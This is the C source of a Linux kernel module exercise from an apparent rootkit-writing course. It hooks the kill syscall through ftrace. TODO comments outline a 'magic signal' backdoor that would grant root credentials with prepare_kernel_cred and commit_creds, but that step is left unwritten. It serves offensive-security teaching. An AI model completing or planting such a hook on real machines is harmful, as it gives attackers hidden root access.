#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/cred.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkitlings");
MODULE_DESCRIPTION("037: magic signal for privilege escalation");

#define MAGIC_SIG 64

static asmlinkage long (*orig_kill)(const struct pt_regs *);

static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = (int)regs->si;

    // TODO(rootkitlings):
    //   1. Si sig == MAGIC_SIG:
    //      a. pr_info pour tracer (pid, comm)
    //      b. prepare_kernel_cred(NULL) + commit_creds
    //      c. Retourner 0 (ne pas transmettre le signal)
    //   2. Sinon, appeler et retourner orig_kill(regs)
    //
    //   ~8 lignes.

    return orig_kill(regs);
}

static struct fthelper_hook hook = {
    .name = "__x64_sys_kill",
    .hook_fn = hook_kill,
    .orig_fn = &orig_kill,
};

static int __init magicsig_init(void)
{
    int ret;

    pr_info("rootkitlings/037: installing kill hook, magic signal = %d\n",
            MAGIC_SIG);
    ret = fthelper_install(&hook);
    if (ret)
        return ret;

    return 0;
}

static void __exit magicsig_exit(void)
{
    fthelper_remove(&hook);
    pr_info("rootkitlings/037: hook removed\n");
}

module_init(magicsig_init);
module_exit(magicsig_exit);
